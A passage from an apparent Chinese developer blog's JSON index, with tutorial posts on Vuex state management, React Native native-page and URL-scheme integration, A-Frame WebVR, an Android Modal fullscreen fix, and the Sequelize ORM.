(handler)。这个回调函数就是我们实际进行状态更改的地方，并且它会接受 state 作为第一个参数： 1234567891011const store = new Vuex.Store(&#123; state: &#123; count: 1 &#125;, mutations: &#123; increment (state) &#123; // 变更状态 state.count++; &#125; &#125;&#125;); 这时修改 App.vue 的代码进行触发： 12345678910111213141516171819&lt;template&gt; &lt;div id='app'&gt; &#123;&#123; count &#125;&#125; &lt;button @click='inc'&gt;点我&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123; mapState &#125; from 'vuex';export default &#123; name: 'App', methods: &#123; inc() &#123; this.$store.commit('increment'); &#125;, &#125;, computed: mapState(['count']),&#125;;&lt;/script&gt; 注意 methods 的函数不能写成箭头函数，不然 this 会是 undefined。 有时候想带一个自增数据过去，那么怎么带呢？ 1this.$store.commit('increment', 10); 改下 mutation： 12345mutations: &#123; increment(state, payload) &#123; state.count += payload; &#125;&#125; commit 第二个参数是要传递过去的 payload，没有第三个参数了，如果是要传递多个的话，建议传对象或者数组。 在 mutation 里只能是数据的处理，不能包含异步函数，如果你要做异步函数的，那么必须使用 action 包装。 1234567891011121314151617const store = new Vuex.Store(&#123; state: &#123; count: 0 &#125;, mutations: &#123; increment(state, payload) &#123; state.count += payload; &#125; &#125;, actions: &#123; inc(&#123; commit, state &#125;, payload) &#123; setTimeout(() =&gt; &#123; commit('increment', payload); &#125;, 1000); &#125;, &#125;&#125;); 看起来有点累赘，的确，如果没有异步操作就没必要写 action 了，浪费时间。 如果嫌弃方法，vuex 提供一个 maoActions 的函数。 12345&lt;button @click='inc(10)'&gt;点我&lt;/button&gt;// ...methods: &#123; ...mapActions(['inc']),&#125;, 分模块在 Vuex 里允许你分模块，类似子 store 的概念。 下面在 modules 目录里创建两个文件，分别是 home.js 和 user.js。 123456789101112131415// home.jsexport default &#123; state: &#123; title: '首页', &#125;, mutations: &#123;&#125;&#125;;// user.jsexport default &#123; state: &#123; title: '用户页', &#125;, mutations: &#123;&#125;,&#125;; 然后在 index.js 里引入： 1234567891011import user from './modules/user';import home from './modules/home';export default () =&gt; new Store(&#123; state: &#123; count: 0 &#125;, modules: &#123; user, home, &#125;,&#125; 接着在 App.vue 里使用。 12345678910111213141516171819202122&lt;template&gt; &lt;div id='app'&gt; &#123;&#123; count &#125;&#125; &#123;&#123; home.title &#125;&#125; &lt;button @click='inc(10)'&gt;点我&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123; mapState, mapActions &#125; from 'vuex';export default &#123; name: 'App', methods: &#123; ...mapActions(['inc']) &#125;, computed: &#123; ...mapState(['count', 'home']) &#125;&#125;;&lt;/script&gt; 基本是 store.state.home.title。 此时显示的就算首页了。 项目结构Vuex 并不限制你的代码结构。但是，它规定了一些需要遵守的规则： 应用层级的状态应该集中到单个 store 对象中。 提交 mutation 是更改状态的唯一方法，并且这个过程是同步的。 异步逻辑都应该封装到 action 里面。 只要你遵守以上规则，如何组织代码随你便。如果你的 store 文件太大，只需将 action、mutation 和 getter 分割到单独的文件。 对于大型应用，希望把 Vuex 相关代码分割到模块中。下面是项目结构示例： 1234567891011121314├── index.html├── main.js├── api│ └── ... # 抽取出API请求├── components│ ├── App.vue│ └── ...└── store ├── index.js # 我们组装模块并导出 store 的地方 ├── actions.js # 根级别的 action ├── mutations.js # 根级别的 mutation └── modules ├── cart.js # 购物车模块 └── products.js # 产品模块 参考资料 https://vuex.vuejs.org/zh/guide/state.html","categories":[{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/categories/Vue/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/tags/Vue/"}]},{"title":"React Native 嵌入并转跳到原生页面","slug":"React Native/React Native 嵌入并转跳到原生页面","date":"2019-01-12T07:01:12.000Z","updated":"2021-06-15T06:10:52.862Z","comments":true,"path":"/stories/2019/01/React Native/React Native 嵌入并转跳到原生页面/","link":"","permalink":"http://me.lizhooh.com/stories/2019/01/React Native/React Native 嵌入并转跳到原生页面/","excerpt":"前言React Native 是一个混合式移动应用开发框架，在默认的情况下会有两个 activity ，一个是 facebook React Native 维护的主 activity，另一个是 debug 用的 activity。所以对于从 React Native 跳转到原生的页面，可以说是从 FB 的 activity 跳转到自定义的 activity 页面。 下面就来看看，在 React Native 里如何嵌入并跳转到原生的页面。","text":"前言React Native 是一个混合式移动应用开发框架，在默认的情况下会有两个 activity ，一个是 facebook React Native 维护的主 activity，另一个是 debug 用的 activity。所以对于从 React Native 跳转到原生的页面，可以说是从 FB 的 activity 跳转到自定义的 activity 页面。 下面就来看看，在 React Native 里如何嵌入并跳转到原生的页面。 步骤总的思路是，需要编写 js 于 java 交互通信的模块，在 js 层调用相关代码，激活原生页面。 创建自定义的 activity（页面）。 编写通信交互代码。 编写模块代码。 在 RN 里注册模块。 在 JS 里使用模块。 创建 Activity打开 Android Studio 创建一个空的 activity 项目， 1234567891011121314// MyActivity.javapackage com.myapp;import android.app.Activity;import android.os.Bundle;public class MyappActivity extends Activity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_myapp); &#125;&#125; 编辑布局文件： 12345678910111213141516&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:app=\"http://schemas.android.com/apk/res-auto\" xmlns:tools=\"http://schemas.android.com/tools\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:gravity=\"center\"&gt; &lt;TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"Hello World!\" android:textColor=\"#333333\" android:textSize=\"24sp\" /&gt;&lt;/LinearLayout&gt; 通信交互这部分代码用于 js 与 java 通信，也是固定的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// MyIntentModule.javapackage com.myapp;import android.app.Activity;import android.content.Intent;import android.text.TextUtils;import com.facebook.react.bridge.Callback;import com.facebook.react.bridge.JSApplicationIllegalArgumentException;import com.facebook.react.bridge.ReactApplicationContext;import com.facebook.react.bridge.ReactContextBaseJavaModule;import com.facebook.react.bridge.ReactMethod;public class MyIntentModule extends ReactContextBaseJavaModule &#123; public MyIntentModule(ReactApplicationContext reactContext) &#123; super(reactContext); &#125; @Override public String getName() &#123; return \"IntentMoudle\"; // &lt;-- 模块名称 &#125; @ReactMethod public void startActivityFromJS(String name, String params)&#123; try &#123; Activity currentActivity = getCurrentActivity(); if (null != currentActivity)&#123; Class toActivity = Class.forName(name); Intent intent = new Intent(currentActivity, toActivity); // 传递的参数 intent.putExtra(\"params\", params); // 启动指定的 Activity currentActivity.startActivity(intent); &#125; &#125; catch (Exception e)&#123; throw new JSApplicationIllegalArgumentException( \"不能打开Activity : \" + e.getMessage() ); &#125; &#125; // 发送消息到 React Native 的 JS 端 @ReactMethod public void dataToJS(Callback successBack, Callback errorBack)&#123; try &#123; Activity currentActivity = getCurrentActivity(); String result = currentActivity.getIntent().getStringExtra(\"data\"); if (TextUtils.isEmpty(result)) &#123; result = \"没有数据\"; &#125; successBack.invoke(result); &#125; catch (Exception e)&#123; errorBack.invoke(e.getMessage()); &#125; &#125;&#125; 编写模块这部分的代码是固定的。 12345678910111213141516171819202122232425// MyReactPackage.javapackage com.myapp;import com.facebook.react.ReactPackage;import com.facebook.react.bridge.NativeModule;import com.facebook.react.bridge.ReactApplicationContext;import com.facebook.react.uimanager.ViewManager;import java.util.Arrays;import java.util.Collections;import java.util.List;/** * 注册模块 */public class MyReactPackage implements ReactPackage &#123; @Override public List&lt;NativeModule&gt; createNativeModules(ReactApplicationContext reactContext) &#123; return Arrays.&lt;NativeModule&gt;asList(new MyIntentModule(reactContext)); &#125; @Override public List&lt;ViewManager&gt; createViewManagers(ReactApplicationContext reactContext) &#123; return Collections.emptyList(); &#125;&#125; 注册模块12345678// MainApplication.java @Override protected List&lt;ReactPackage&gt; getPackages() &#123; return Arrays.&lt;ReactPackage&gt;asList( ... new MyReactPackage() // &lt;-- 这里 ); &#125; JS 层调用123456789import &#123; NativeModules &#125; from 'react-native';function startActivity(name, data) &#123; NativeModules.IntentMoudle .startActivityFromJS(\"com.mapp.\" + name, data);&#125;startActivity('MyActivity'); // &lt;-- 自定义的 Activity 类名 好了，这样就可以嵌入并转跳到原生的页面了，这里页面的内容只是简单的文本 Hello world!，具体还是根据实际内容来编写。","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"A-Frame 构建我的虚拟世界（WebVR）- 介绍","slug":"WebVR/A-Frame 构建我的虚拟世界（WebVR）- 介绍","date":"2018-12-31T04:37:02.000Z","updated":"2021-06-15T06:10:52.902Z","comments":true,"path":"/stories/2018/12/WebVR/A-Frame 构建我的虚拟世界（WebVR）- 介绍/","link":"","permalink":"http://me.lizhooh.com/stories/2018/12/WebVR/A-Frame 构建我的虚拟世界（WebVR）- 介绍/","excerpt":"A-FrameA-Frame 是一个用来构建虚拟现实（VR）应用的 Web 开发框架。由 WebVR 的发起人 Mozilla VR 团队所开发，是当下用来开发 WebVR 内容最强大最易用的技术方案。虚拟现实（VR）是一种技术，使用头显设备产生逼真的图像，声音和其他感觉，使得用户进入身临其境的虚拟环境。 这里有几个有趣的示例： https://paperplanes.world/ https://tympanus.net/Tutorials/TheAviator/ A-Frame 支持非常多的平台，包括了： 桌面电脑上的虚拟现实和头戴设备 移动设备上的虚拟现实和头戴设备 平面桌面设备（也就是普通电脑显示器、鼠标和键盘）","text":"A-FrameA-Frame 是一个用来构建虚拟现实（VR）应用的 Web 开发框架。由 WebVR 的发起人 Mozilla VR 团队所开发，是当下用来开发 WebVR 内容最强大最易用的技术方案。虚拟现实（VR）是一种技术，使用头显设备产生逼真的图像，声音和其他感觉，使得用户进入身临其境的虚拟环境。 这里有几个有趣的示例： https://paperplanes.world/ https://tympanus.net/Tutorials/TheAviator/ A-Frame 支持非常多的平台，包括了： 桌面电脑上的虚拟现实和头戴设备 移动设备上的虚拟现实和头戴设备 平面桌面设备（也就是普通电脑显示器、鼠标和键盘） 声明式结构A-Frame 是基于 HTML 声明的，在运行阶段是使用 WebGL，Three.js 来执行的。由于 A-Frame 基于 HTML，因此大多数现有的工具和库的工作框架，包括 React，Vue.js，Angular，d3.js，jQuery 都能够和 A-Frame 一起工作。 快速开始通过使用一个通用的入门套件，来快速开始吧。 123git clone https://github.com/aframevr/aframe-boilerplate.gitnpm installnpm start 运行相关命令之后，在浏览器里就可以看到示例。之后把代码修改一下： 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;Hello, World! - A-Frame&lt;/title&gt; &lt;meta name=\"description\" content=\"Hello, World! - A-Frame\"&gt; &lt;script src=\"https://cdn.bootcss.com/aframe/0.7.0/aframe-master.min.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!--场景--&gt; &lt;a-scene&gt; &lt;!--正方形--&gt; &lt;a-sphere position=\"0 1.25 -5\" radius=\"0.5\" color=\"#66ffcc\"&gt;&lt;/a-sphere&gt; &lt;!--圆形--&gt; &lt;a-box position=\"-3 1.5 -5\" rotation=\"30 40 30\" color=\"#4CC3D9\" id='box'&gt;&lt;/a-box&gt; &lt;!--柱形--&gt; &lt;a-cylinder position=\"2 0.75 -3\" radius=\"0.25\" height=\"2.5\" color=\"#FFC65D\"&gt;&lt;/a-cylinder&gt; &lt;!--平面--&gt; &lt;a-plane position=\"0 -1 -4\" rotation=\"-90 0 0\" width=\"8\" height=\"3\" color=\"#7BC8A4\"&gt;&lt;/a-plane&gt; &lt;!--天空--&gt; &lt;a-sky color=\"#ECECEC\"&gt;&lt;/a-sky&gt; &lt;/a-scene&gt;&lt;/body&gt;&lt;/html&gt; 在这里，通过 A-Frame 提供的组件创建了几个物体。 在手机上，看到这样的情景： 由于A-Frame在HTML部分仅做声明，因此可以结合其他框架来改变这种声明。 123456789101112&lt;script src=\"https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js\"&gt;&lt;/script&gt;&lt;script&gt; $(function() &#123; // 2 秒后，改变旋转和空间位置 setTimeout(() =&gt; &#123; $(\"#box\").attr(&#123; rotation: '0 0 0', position: '-3 0.5 -5', &#125;); &#125;, 2000); &#125;)&lt;/script&gt; 加上这段代码后，会发现在指定时间后，正方形的空间位置以及角度发生了变化。因此可以看出，在 DOM 发生改变时，直接会引发 A-Frame 的内核引擎重新渲染。 原语组件尽管 HTML 层看起来很基础，HTML 和 DOM 只是 A-Frame 的表面抽象层。在底层上，A-Frame 实现了一个实体 - 组件（entity-component）框架。例如 &lt;a-box&gt; 和 &lt;a-sky&gt; 这些，被称为“原语”组件，它和 React 的组件有些类似。 对于 &lt;a-box&gt;： 1&lt;a-box color=\"red\" width=\"3\"&gt;&lt;/a-box&gt; 实际上它的基本结构是： 1&lt;a-entity geometry=\"primitive: box; width: 3\" material=\"color: red\"&gt;&lt;/a-entity&gt; 原语（Primitive）本质上就是一个 &lt;a-entity&gt;，所有的组件都是通过 &lt;a-entity&gt; 集成而来。 自定义原语组件下面是 A-Frame 中&lt;a-box&gt;原语的代码： 1234567891011121314151617const extendDeep = AFRAME.utils.extendDeep;const meshMixin = AFRAME.primitives.getMeshMixin();// 组件名，继承的属性，迷信AFRAME.registerPrimitive('a-box', extendDeep(&#123;&#125;, meshMixin, &#123; // 一些默认值 defaultComponents: &#123; // rotation: &#123;x: -90, y: 0, z: 0&#125; geometry: &#123; primitive: 'box' &#125; &#125;, // 从 HTML 定义的映射属性的组件属性（使用点分隔符） // 比如 &lt;a-box height='10'/&gt; =&gt; geometry.height = 10 mappings: &#123; depth: 'geometry.depth', height: 'geometry.height', width: 'geometry.width' &#125;&#125;)); 实体，组件，系统A-Frame 基于 Three.js 框架，并且使用了实体 - 组件 - 系统（entity-component-system）。 A-Frame 中的 ECS 包括了： 实体（Entities） 对应的是 &lt;a-entity&gt; 元素和原型。 组件（Components） 通过 &lt;a-entity&gt; 的 HTML 属性来表示。底层实现上， 组件是包含模式（schema）、生命周期处理器和方法的对象。组件通过 AFRAME.registerComponent (name, definition) API 来注册。 系统（Systems） 通过 &lt;a-scene&gt; 的 HTML 属性来表示。系统在定义上和组件类似，系统通过 AFRAME.registerSystem (name, definition) API来注册。 扩展如果你像笔者一样的喜欢 React 那种组件化编程，那么你可以使用 A-Frame 的 React 版本：aframe-react。 参考资料 https://aframe.io/ https://github.com/aframevr/aframe http://www.techbrood.com/aframe/guides?p=building-a-basic-scene","categories":[{"name":"WebVR","slug":"WebVR","permalink":"http://me.lizhooh.com/categories/WebVR/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"A-Frame","slug":"A-Frame","permalink":"http://me.lizhooh.com/tags/A-Frame/"},{"name":"WebVR","slug":"WebVR","permalink":"http://me.lizhooh.com/tags/WebVR/"}]},{"title":"🎉 React Native 解决 Modal 不完全全屏问题","slug":"React Native/React Native 解决 Modal 不完全全屏问题","date":"2018-12-28T10:19:46.000Z","updated":"2021-06-15T06:10:52.865Z","comments":true,"path":"/stories/2018/12/React Native/React Native 解决 Modal 不完全全屏问题/","link":"","permalink":"http://me.lizhooh.com/stories/2018/12/React Native/React Native 解决 Modal 不完全全屏问题/","excerpt":"前言众所周知，React Native 在 0.40 之前 Modal 组件是完全全屏的（Android），在之后不知为什么就变成了不完全全屏了（效果如下图）。 现在终于解决了让我这种处女座发疯的问题，使用 react-native-modal-translucent 即可解决。","text":"前言众所周知，React Native 在 0.40 之前 Modal 组件是完全全屏的（Android），在之后不知为什么就变成了不完全全屏了（效果如下图）。 现在终于解决了让我这种处女座发疯的问题，使用 react-native-modal-translucent 即可解决。 开始只支持 Android，因为 IOS 是完全全屏的。 先安装模块： 12yarn add react-native-modal-translucentreact-native link react-native-modal-translucent 接着记得在要 package.json 里添加代码，这里的作用是在文件处理级别上，替换小小的 Java 代码。 1234\"scripts\": &#123; \"fix-modal\": \"node node_modules/react-native-modal-translucent/scripts/translucent-modal.js\", \"postinstall\": \"npm run fix-modal\"&#125; 之后就没有代码要改了，重新编译后，打开 Modal 组件就是完全的全屏了。🎉🎉🎉","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native 实现在 Web 端打开 App","slug":"React Native/React Native 实现在 Web 端打开 App","date":"2018-12-25T02:33:16.000Z","updated":"2021-06-15T06:10:52.862Z","comments":true,"path":"/stories/2018/12/React Native/React Native 实现在 Web 端打开 App/","link":"","permalink":"http://me.lizhooh.com/stories/2018/12/React Native/React Native 实现在 Web 端打开 App/","excerpt":"前言在 React Native 里，实现类似微博或者知乎的在 App 中打开的功能，从 Web 端唤起 App。","text":"前言在 React Native 里，实现类似微博或者知乎的在 App 中打开的功能，从 Web 端唤起 App。 原理不管 Ios 还是 Android，浏览器都不可能预知本地是否安装了某个 App 的。或者更严谨地说，我们不能通过浏览器来预知本地是否安装。因为就算浏览器可以读取本地应用的安装列表，但是目前也没任何一家浏览器提供查询的 API，所以这条路是走不通的。 唤起 App 利用的是 URL scheme，利用我们通常用的协议是 http://，实际上你还可以试试 zhihu://，mqq:// 这样就会唤起知乎和 QQ 了。因此对于你的 App 来说也是一样的，通过自定义协议，在打开 url 时系统会自动的查找并打开 App，就是这么简单。 常用的 App url scheme： https://bbs.feng.com/read-htm-tid-8941179.html http://www.hangge.com/blog/cache/detail_1141.html https://www.cnblogs.com/zhouxiuquan/p/4568094.html Web 端在 Web 端里，我们使用 a 产生转跳相应的链接，同时在点击时转跳到下载页面（示例是一个 SAP 应用）。 123456789const Button = styled.a` // ...`;&lt;Button href='myapp://?type=video&amp;id=10001' onClick=&#123;e =&gt; &#123; route.download();&#125;&#125; className='gradient-dark'&gt; 打开 App&lt;/Button&gt; Android 端在 Android 端里需要做的是添加相应的 intent-filter，具体什么是 intent-filter 这里具体就不说明了。 12345678910111213141516171819&lt;activity android:name=\".MainActivity\" android:label=\"@string/app_name\" android:configChanges=\"keyboard|keyboardHidden|orientation|screenSize\" android:windowSoftInputMode=\"adjustResize\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.MAIN\" /&gt; &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt; &lt;/intent-filter&gt; &lt;!-- 从 Web 打开 App 的 intent-filter --&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.VIEW\" /&gt; &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt; &lt;category android:name=\"android.intent.category.BROWSABLE\" /&gt; &lt;data android:scheme=\"myapp\" /&gt; &lt;/intent-filter&gt; &lt;!-- 从 Web 打开 App 的 intent-filter --&gt;&lt;/activity&gt; 这个 intent-filter 告诉 App 如果有触发打开 myapp:// 协议的 url，则唤起 App。好了，现在是能够唤起 App 了，但是有时候还需要一点定点转跳的功能。 1234567891011121314151617181920212223import &#123; ToastAndroid as Toast, Linking,&#125; from 'react-native';import qs from 'qs';componentDidMount() &#123; Linking.getInitialURL().then(url =&gt; &#123; if (url == null || typeof url !== 'string') return; let type, id; try &#123; const [_, str] = url.split('?'); const obj = qs.parse(str); type = obj.type; id = obj.id; &#125; catch (err) &#123; &#125; Toast.show('正在打开页面', Toast.SHORT); if (type === 'video') &#123; // ... 打开视频页面 &#125; &#125;&#125; 完结，点击 打开 App 就会打开相应的 App 并且转跳到目标页。 参考资料 https://www.jianshu.com/p/351c2f690569","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"Sequelize 学习笔记","slug":"Mysql/Sequelize 学习笔记","date":"2018-12-24T14:05:29.000Z","updated":"2021-06-15T06:10:52.829Z","comments":true,"path":"/stories/2018/12/Mysql/Sequelize 学习笔记/","link":"","permalink":"http://me.lizhooh.com/stories/2018/12/Mysql/Sequelize 学习笔记/","excerpt":"前言Sequelize 是 Nodejs 的一个关系式数据库的 ROM，支持 Postgres、MySQL、SQLite 和 Microsoft SQL Server. 它具有强大的事务支持，关联关系，读取和复制等功能。 值得高兴的是 Sequelize 有中文文档，本文也是根据中文文档进行介绍与学习。下面是根据 v4 版本的，因为 v5，v6 删除了很多 api。","text":"前言Sequelize 是 Nodejs 的一个关系式数据库的 ROM，支持 Postgres、MySQL、SQLite 和 Microsoft SQL Server. 它具有强大的事务支持，关联关系，读取和复制等功能。 值得高兴的是 Sequelize 有中文文档，本文也是根据中文文档进行介绍与学习。下面是根据 v4 版本的，因为 v5，v6 删除了很多 api。 基本使用下面的内容是使用 Mysql，需要安装 Sequelize 和 Mysql。 12yarn add sequelize mysql2yarn add @types/sequelize # 智能提示 安装完成后看看基本的初始代码。 123456789101112131415161718192021222324252627282930const Sequelize = require('sequelize');const sequelize = new Sequelize('test', 'root', 'root', &#123; host: 'localhost', dialect: 'mysql', pool: &#123; max: 5, min: 0, acquire: 30000, idle: 10000, &#125;, operatorsAliases: false, timezone: '+08:00', // 配置时区，默认是 0 时区 charset: 'utf8', // 配置字符集（默认会中文乱码）&#125;);const User = sequelize.define('user', &#123; username: Sequelize.STRING, birthday: Sequelize.DATE&#125;);sequelize.sync() .then(() =&gt; User.create(&#123; username: 'janedoe', birthday: new Date(2018, 6, 20) &#125;)) .then(jane =&gt; &#123; console.log(jane.toJSON()); &#125;); 这里，大致的意思时连接的数据库为：test，用户名为 root，用户密码为：root。 然后定义一个数据模型为：User。接着创建一个用户，并且获取创建完成后的信息。 运行之后可以看到有输出 SQL 信息，可以在配置项里添加 logging: false 关闭 SQL 日志信息。 模型如果使用过 Mongoose 一定对模型不模式，在 Sequelize 里模型也同样非常重要，它对应的是 Mysql 表的数据结构。 模型使用 sequelize.define(&#39;name&#39;, { attributes }, { options }) 来定义。 1234567891011121314151617181920212223242526const User = sequelize.define('user', &#123; firstName: &#123; type: Sequelize.STRING &#125;, lastName: &#123; type: Sequelize.STRING &#125;, flag: &#123; type: Sequelize.BOOLEAN, allowNull: false, // 不运行 null defaultValue: true // 如果没有提供值，则设置为 true unique: true, // 唯一索引 primaryKey: true, // 定义主键 field: 'field_with_underscores', // 自定义字段名称，否则就是 flag &#125;, // 这可以创建一个外键: bar_id: &#123; type: Sequelize.INTEGER, references: &#123; // 这是引用另一个模型 model: Bar, // 这是引用模型的列名称 key: 'id', &#125;, &#125;,&#125;); Sequelize 的模型默认是自带 id，createAt，updateAt 字段的。id 为主键，并且是自增主键。 这里可以查看具体的数据类型，已经相关的配置项：Model definition - 模型定义 创建（Create） create - 在数据库中的插入新的项。 bulkCreate - 批量在数据库中的插入新的项。 123456789User.create(&#123; username: 'janedoe', birthday: new Date(2018, 6, 20),&#125;);User.bulkCreate([ &#123; username: 'barfooz', isAdmin: true &#125;, &#123; username: 'foo', isAdmin: true &#125;, &#123; username: 'bar', isAdmin: false &#125;]); 更新（Update） update - 更新数据库中的符合条件的项。 insertOrUpdate - 如果存在则更新，不存在则插入数据。相当于 save 功能。 upsert - 与 insertOrUpdate 相同，新替换 api。 12345678Post.update(&#123; updatedAt: null, // 这里是更新的内容&#125;, &#123; where: &#123; // 查询的内容 deletedAt: &#123; [Op.ne]: null &#125; &#125;,&#125;);// UPDATE post SET updatedAt = null WHERE deletedAt NOT NULL; 查询（Review） findAll - 搜索数据库中的符合条件的所有项。 findById - 根据 id，搜索数据库中的一个特定项。 findOne - 搜索数据库中的一个特定项。 findOrCreate - 如果找到则返回，找不到则先创建再返回。 findAndCountAll - 在数据库中搜索多个元素，返回数据和总计数。 这些函数都返回 Promise 对象，查找不打时获取的值是 null，查找成功之后是一个复杂的描述对象，使用 toJSON 转为数据对象。 123456789101112131415161718192021222324252627282930313233343536User.findAll(&#123; where: &#123; id: [1 ,2, 3] &#125; &#125;);User.findById(123);User.findOne(&#123; where: &#123; title: 'aProject' &#125;, // 查找条件 attributes: ['id', ['name', 'title']], // 返回的字段，并且（name as title）&#125;);// 相当于查找 title 为 aProject 的，没有指定 attributes 时为返回全部字段// Select User from * Where title = 'aProject'User.findOrCreate(&#123; where: &#123; username: 'sdepold' &#125;, defaults: &#123; job: 'Technical Lead JavaScript' &#125;&#125;).spread((user, created) =&gt; &#123; console.log(user.get(&#123; plain: true &#125;)); console.log(created); // 布尔值&#125;);// 找不到时，则会创建这么一个东西/* &#123; username: 'sdepold', job: 'Technical Lead JavaScript', id: 1, createdAt: Fri Mar 22 2013 21: 28: 34 GMT + 0100(CET), updatedAt: Fri Mar 22 2013 21: 28: 34 GMT + 0100(CET)&#125; */User.findAndCountAll(&#123; where: &#123; // 模糊查询，使用操作符 like title: &#123; [Sequelize.Op.like]: 'foo%' &#125; &#125;, offset: 10, limit: 2&#125;).then(result =&gt; &#123; console.log(result.count); console.log(result.rows);&#125;); 返回字段名使用 attributes 控制返回的字段名。 123456789User.findAll(&#123; attributes: ['id', 'title'], // Select id, title from ... attributes: ['id', ['title', 'name'], // Select id, title as name from ... attributes: &#123; // Select id, title from ... // include: [], // 因为默认是 include 操作，你可以使用 exclude 来做相反操作 exclude: [], &#125;,&#125;); 查询操作符使用操作符，进行查询： 1234567891011121314151617181920212223242526272829const Op = Sequelize.Op;User.findAll(&#123; where: &#123; id: &#123; [Op.and]: &#123;a: 5&#125;, // 且 (a = 5) [Op.or]: [&#123;a: 5&#125;, &#123;a: 6&#125;], // (a = 5 或 a = 6) [Op.gt]: 6, // id &gt; 6 [Op.gte]: 6, // id &gt;= 6 [Op.lt]: 10, // id &lt; 10 [Op.lte]: 10, // id &lt;= 10 [Op.ne]: 20, // id != 20 [Op.between]: [6, 10], // 在 6 和 10 之间 [Op.notBetween]: [11, 15], // 不在 11 和 15 之间 [Op.in]: [1, 2], // 在 [1, 2] 之中 [Op.notIn]: [1, 2], // 不在 [1, 2] 之中 [Op.like]: '%hat', // 包含 '%hat' [Op.notLike]: '%hat', // 不包含 '%hat' [Op.iLike]: '%hat', // 包含 '%hat' (不区分大小写) (仅限 PG) [Op.notILike]: '%hat', // 不包含 '%hat' (仅限 PG) [Op.overlap]: [1, 2], // &amp;&amp; [1, 2] (PG数组重叠运算符) [Op.contains]: [1, 2], // @&gt; [1, 2] (PG数组包含运算符) [Op.contained]: [1, 2], // &lt;@ [1, 2] (PG数组包含于运算符) [Op.any]: [2,3], // 任何数组[2, 3]::INTEGER (仅限 PG) &#125;, status: &#123; [Op.not]: false, // status 不为 FALSE &#125; &#125;&#125;); 分组，排序分页，偏移量，分组，排序等操作： 123User.findAll(&#123; order: 'title DESC' &#125;);User.findAll(&#123; group: 'name' &#125;);User.findAll(&#123; offset: 10, limit: 2 &#125;); 聚合函数 count - 计算数据库中元素的出现次数。 max - 获取特定表中特定属性的最大值。 min - 获取特定表中特定属性的最小值。 sum - 特定属性的值求和。 decrement - 增加/减少指定的值。 删除（Delete） destroy - 在数据库里删除符合条件的项。 1234Post.destroy(&#123; where: &#123; status: 'inactive' &#125;&#125;);// DELETE FROM post WHERE status = 'inactive'; 关联（Associations）关联有几个内容： BelongsTo（属于） HasOne（有一个） HasMany（有很多） BelongsToMany（属于很多） 举一个例子：假设有文章表，用户表。 123456789101112131415161718192021222324252627282930313233343536373839const User = sequelize.define('user', &#123; name: Sequelize.STRING, birthday: Sequelize.DATE,&#125;);const Article = sequelize.define('article', &#123; content: Sequelize.STRING,&#125;);// 将会添加 userId 到 Article 模型里// 因此 Article 的字段应该是 id, concent, userIdArticle.belongsTo(User);+ async function () &#123; await sequelize.sync(); await User.bulkCreate([&#123; id: 1, name: '小明', birthday: new Date(2018, 6, 20), &#125;, &#123; id: 2, name: '小美', birthday: new Date(2018, 4, 12), &#125;, &#123; id: 3, name: '小东', birthday: new Date(2017, 12, 12), &#125;]); await Article.bulkCreate([ &#123; id: 1, content: '今天吃什么？', userId: 1 &#125;, &#123; id: 2, content: '吃鸡腿。', userId: 1 &#125;, &#123; id: 3, content: '吃龙虾。', userId: 2 &#125;, &#123; id: 4, content: '明天吃什么？', userId: 2 &#125;, &#123; id: 5, content: '吃麻辣烫。', userId: 3 &#125;, ]); process.exit(0);&#125;(); 现在为了获取文章列表，需要包含用户信息，整理出来的数据格式要求是： 123456789&#123; id: 1, content: '今天吃什么？', user: &#123; id: 1, name: '小明', birthday: '2018-07-19 16:00:00', &#125;,&#125; 怎么搞？先来看看原始的做法： 12Select a.id, a.content, b.userId, b.userName from article a Join user b On a.userId == b.id 再来看看 sequelize 的做法： 12345678910111213141516// 这里的关系是，article 与 user 进行连接查询// 连接的条件是：user.state === article.stateconst res = await Article.findAll(&#123; attributes: &#123; exclude: 